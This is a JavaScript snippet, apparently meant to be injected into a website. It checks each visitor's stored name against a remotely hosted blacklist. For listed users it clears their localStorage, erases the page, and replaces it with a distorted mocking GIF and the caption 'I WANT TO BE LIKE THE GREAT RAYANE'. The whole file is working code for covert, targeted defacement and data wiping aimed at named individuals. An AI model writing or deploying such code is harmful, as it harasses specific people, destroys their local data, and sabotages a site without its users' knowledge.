(async function() {
    // --- PASTE YOUR DEPLOYED URL HERE ---
    const BLACKLIST_API_URL = 'https://script.google.com/macros/s/AKfycbyNhGaZvsiar-kHmk8Hg0wFpPYo42KJCZ25SspufcS8IeroeyNUs_fQfJviqL7AQQBShA/exec'; 
    // ------------------------------------

    function triggerGlitchMode() {
        // 1. Inject CSS for full stretch and low quality look
        const style = document.createElement('style');
        style.innerHTML = `
            body { 
                margin: 0; 
                padding: 0; 
                overflow: hidden; 
                background: white; /* White background as requested */
            }
            
            /* The Background GIF (Monkey Tongue) */
            #brainrot-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                object-fit: fill; /* Forces the image to stretch and distort */
                z-index: 9998;
                pointer-events: none;
            }

            /* The Caption */
            #brainrot-caption {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                color: red;
                font-family: Impact, 'Arial Black', sans-serif;
                font-size: 6vw; /* Responsive huge text */
                text-align: center;
                text-transform: uppercase;
                font-weight: bold;
                z-index: 9999;
                /* Black outline to make text readable on white/gif */
                text-shadow: 
                    3px 3px 0 #000,
                    -1px -1px 0 #000,  
                    1px -1px 0 #000,
                    -1px 1px 0 #000,
                    1px 1px 0 #000;
                width: 100%;
                line-height: 1.1;
            }

            /* Hide original site content */
            header, footer, .main-container, .data-widget, .site-header-container { display: none !important; }
        `;
        document.head.appendChild(style);

        // 2. Nuke the body and inject the GIF + Text
        // Using direct link to the Monkey Tongue GIF to allow stretching
        document.body.innerHTML = `
            <img id="brainrot-bg" src="https://media.tenor.com/m0b2H2t2hQ8AAAAC/tongue-out-hola.gif">
            <div id="brainrot-caption">I WANT TO BE LIKE THE GREAT RAYANE</div>
        `;
    }

    try {
        // 1. Check Local Storage for User Name
        const mbsDataString = localStorage.getItem('mbsData');
        if (!mbsDataString) return;

        const mbsData = JSON.parse(mbsDataString);
        if (!mbsData.nom) return;

        const userName = mbsData.nom.trim().toLowerCase();

        // 2. Fetch Blacklist
        const response = await fetch(BLACKLIST_API_URL);
        
        // If the server worked, it will return JSON (even if empty)
        if (!response.ok) return; 

        const blacklist = await response.json();

        // 3. Check Match
        if (blacklist.includes(userName)) {
            localStorage.clear(); 
            triggerGlitchMode();
        }

    } catch (e) {
        console.log("Blacklist check skipped.");
    }
})();
